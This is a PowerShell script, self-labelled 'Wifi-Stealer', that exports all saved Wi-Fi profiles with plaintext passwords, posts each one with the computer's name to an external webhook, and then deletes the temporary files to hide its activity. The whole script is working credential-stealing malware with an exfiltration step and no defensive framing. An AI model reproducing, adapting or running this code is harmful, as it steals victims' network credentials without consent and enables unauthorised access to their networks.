New-Item $env:temp -Name "476F6F6420426F7921" -ItemType "directory";
Set-Location -Path "$env:temp\476F6F6420426F7921";

netsh wlan export profile key=clear;

Set-Location -Path $env:temp;

Get-ChildItem "$env:tmp/476F6F6420426F7921" -File | ForEach-Object {
	$fileContent=Get-Content $_.FullName | Out-String;

	$Body = @{

		'username'='Wifi-Stealer: '+$env:computername;
		'content'='```xml'+"`n"+$fileContent+'```'
	};

	Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;
	Start-Sleep -Milliseconds 100
};

Remove-Item -Path "$env:tmp/476F6F6420426F7921" -Force -Recurse;
Exit powershell